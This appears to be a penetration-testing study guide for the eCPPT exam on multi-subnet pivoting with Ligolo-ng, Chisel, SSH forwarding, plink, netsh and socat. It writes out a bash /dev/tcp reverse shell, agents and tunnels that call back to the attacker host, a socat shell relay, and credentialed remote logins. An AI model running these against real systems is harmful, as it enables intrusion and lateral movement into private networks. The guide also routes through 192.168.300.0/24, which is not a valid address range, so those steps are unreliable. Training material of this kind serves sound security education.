# 03 - Pivoting, Tunneling & Multi-Subnet Redirection

[⬅️ Back to Master Index](README.md)

---

## 📌 1. Multi-Subnet Pivoting Architecture

In enterprise penetration tests and the eCPPT exam, the target infrastructure is heavily segmented into distinct, firewalled network zones (DMZ, Corporate LAN, Secure Management, Domain Controllers). Gaining a shell on a perimeter host is only step one.

```text
[Kali Attacker]
   IP: 192.168.100.5
          │
          │ (Subnet 1: 192.168.100.0/24)
          ▼
   [Pivot Host 1: DMZ Web Server]
   NIC 1: 192.168.100.15  <-- Direct communication with Kali
   NIC 2: 192.168.200.15  <-- Connected to Internal Corporate Subnet
          │
          │ (Subnet 2: 192.168.200.0/24) - Inaccessible directly from Kali!
          ▼
   [Pivot Host 2: Internal File Server]
   NIC 1: 192.168.200.25
   NIC 2: 192.168.300.25  <-- Connected to Domain Controller Subnet
          │
          │ (Subnet 3: 192.168.300.0/24) - Two hops away from Kali!
          ▼
   [Domain Controller]
   IP: 192.168.300.10
```

---

## 🚀 2. Modern Pivoting: Ligolo-ng (Recommended)

**Ligolo-ng** uses a TUN virtual network interface to establish **true Layer-3 routing** from your Kali machine into target subnets. Unlike SOCKS proxies, you do **not** need Proxychains; tools like `nmap`, `netexec`, `curl`, and Impacket execute natively with normal routing speed.

### Step 1: Prepare the TUN Interface on Kali
Run once per session on your attacking machine:
```bash
# Create the TUN interface named 'ligolo'
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up
```

### Step 2: Start the Ligolo Proxy Server on Kali
```bash
# Launch the proxy listener with a self-signed TLS certificate
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Step 3: Deploy the Ligolo Agent on the Compromised Pivot Host
Transfer the lightweight `agent` binary to the pivot machine and execute:

#### On Linux Pivot:
```bash
chmod +x agent
./agent -connect 192.168.100.5:11601 -ignore-cert
```

#### On Windows Pivot:
```powershell
.\agent.exe -connect 192.168.100.5:11601 -ignore-cert
```

### Step 4: Activate Session & Route the Internal Subnet
Inside the interactive Ligolo proxy console on Kali:
```text
ligolo-ng » session
[1] 192.168.100.15 - dmz-web01 (Linux)

ligolo-ng » session 1
[1] dmz-web01 » start
[INFO] Starting tunnel to session 1...
```

Now, in a separate terminal on Kali, add the route for the newly discovered internal subnet:
```bash
# Add routing table entry through the ligolo TUN device
sudo ip route add 192.168.200.0/24 dev ligolo

# Verify routing is active
ip route show
```
*You can now ping, scan with Nmap, and interact with `192.168.200.0/24` directly from Kali!*

### Step 5: Handling Reverse Shells Through Ligolo-ng (Listeners)
When exploiting a deep internal host (`192.168.200.50`), it cannot route back to Kali's IP (`192.168.100.5`). Use Ligolo's built-in listener feature:

1. Inside your active session in the Ligolo proxy console:
   ```text
   [1] dmz-web01 » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
   [INFO] Listener created on 0.0.0.0:4444 -> 127.0.0.1:4444
   ```
2. Start Netcat listener on Kali:
   ```bash
   nc -lvnp 4444
   ```
3. Craft the exploit payload on `192.168.200.50` to point to the **Pivot's Internal IP**:
   ```bash
   # Reverse shell destination is Pivot Host NIC 2 (192.168.200.15), NOT Kali!
   bash -i >& /dev/tcp/192.168.200.15/4444 0>&1
   ```
   *The pivot agent transparently tunnels the shell back to your Kali Netcat listener!*

---

## 🔀 3. Pivoting with Chisel & Proxychains

Chisel creates an encrypted TCP/UDP tunnel over HTTP/WebSockets, exposing a local SOCKS5 proxy on Kali.

### Step 1: Start Chisel Server on Kali
```bash
chisel server -p 8000 --reverse -v
```

### Step 2: Connect Chisel Client from the Compromised Pivot
Transfer `chisel` to the pivot host and connect back:

#### Linux Pivot:
```bash
./chisel client 192.168.100.5:8000 R:socks
```

#### Windows Pivot:
```cmd
chisel.exe client 192.168.100.5:8000 R:socks
```
*By default, this exposes a SOCKS5 proxy on `127.0.0.1:1080` on Kali.*

### Step 3: Configure Proxychains on Kali
Edit `/etc/proxychains4.conf`:
```ini
# Ensure strict_chain is enabled and quiet_mode is active
strict_chain
quiet_mode
proxy_dns

[ProxyList]
# socks5 [IP] [Port]
socks5 127.0.0.1 1080
```

### Step 4: Running Commands Through Proxychains
Always use full TCP connect (`-sT`) and no ping (`-Pn`) with Nmap:
```bash
# Nmap scan over proxychains
proxychains -q nmap -sT -Pn -p 80,445,3389 192.168.200.25

# Interacting with SMB
proxychains -q smbclient -L //192.168.200.25/ -N

# Authenticating with Evil-WinRM
proxychains -q evil-winrm -i 192.168.200.25 -u Administrator -p 'Password123'
```

### Local Port Forwarding with Chisel (Direct Port Map)
If you only need access to a specific internal service (e.g., internal web app on `192.168.200.25:8443`):
```bash
# On Pivot Host: Map target port to local port on Kali
./chisel client 192.168.100.5:8000 R:9000:192.168.200.25:8443

# On Kali: Access directly via localhost
curl -k https://127.0.0.1:9000
```

---

## 🔐 4. Classic SSH Tunneling & Port Forwarding

When SSH access is available on a compromised pivot host:

### 1. Dynamic Port Forwarding (SOCKS Proxy)
Creates a local SOCKS proxy on your Kali attacking machine:
```bash
ssh -D 1080 -N -f user@192.168.100.15
# Traffic sent through 127.0.0.1:1080 is routed through 192.168.100.15
```

### 2. Local Port Forwarding (-L)
Forward a port from your Kali machine to an internal service via the pivot:
```bash
# Syntax: ssh -L [local_port]:[target_internal_ip]:[target_port] user@pivot
ssh -L 8080:192.168.200.25:80 user@192.168.100.15 -N -f
# Access http://localhost:8080 on Kali to view 192.168.200.25:80
```

### 3. Remote / Reverse Port Forwarding (-R)
Expose a port on the pivot host that forwards back to Kali (ideal for catching shells):
```bash
# Syntax: ssh -R [pivot_listen_port]:[kali_target_ip]:[kali_target_port] user@pivot
ssh -R 4444:127.0.0.1:4444 user@192.168.100.15 -N -f
```

### 4. Plink.exe (SSH for Windows Pivot Hosts)
When the pivot is a Windows host and you want to forward a port back to your Kali SSH server:
```cmd
cmd.exe /c echo y | plink.exe -ssh -l kali_user -pw kali_password 192.168.100.5 -R 1080:127.0.0.1:1080 -N
```

---

## 🔁 5. Native Port Redirection Utilities

### 1. Windows Native: Netsh Portproxy
Administrators on Windows can redirect ports natively without third-party utilities:

```cmd
# Forward incoming connections on port 8080 to an internal host on port 80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.200.25

# Verify active port forwarders
netsh interface portproxy show all

# Ensure Windows Firewall allows the port
netsh advfirewall firewall add rule name="Forward_8080" dir=in action=allow protocol=TCP localport=8080

# Clean up rule after engagement
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### 2. Linux: Socat Port Forwarding
Socat is an extraordinary multipurpose relay utility:

```bash
# Redirect incoming connections on port 8080 to an internal host on port 80
socat TCP-LISTEN:8080,fork TCP:192.168.200.25:80 &

# Reverse Shell Relayer (Catch shell from Subnet 2 and bounce to Kali)
# Listens on pivot port 4444 and redirects all traffic to Kali on port 4444
socat TCP-LISTEN:4444,fork TCP:192.168.100.5:4444 &
```

---

## 🪜 6. Multi-Hop Pivoting Strategy (Double Pivot)

When attacking deep networks separated by two distinct pivot machines (Kali -> Pivot 1 -> Pivot 2 -> Target):

### Ligolo-ng Double Pivot Workflow
1. Establish Ligolo agent from Pivot 1 (`192.168.100.15`) back to Kali. Route `192.168.200.0/24 dev ligolo`.
2. Compromise Pivot 2 (`192.168.200.25`) which has access to `192.168.300.0/24`.
3. In Ligolo console on Kali, configure a listener on Session 1:
   ```text
   [1] dmz-web01 » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. On Pivot 2, execute the Ligolo agent pointing to **Pivot 1**:
   ```bash
   ./agent -connect 192.168.200.15:11601 -ignore-cert
   ```
5. On Kali, a new session (Session 2) will appear! Select Session 2, run `start`, and add route:
   ```bash
   sudo ip route add 192.168.300.0/24 dev ligolo
   ```
*You now have transparent layer-3 connectivity into Subnet 3!*
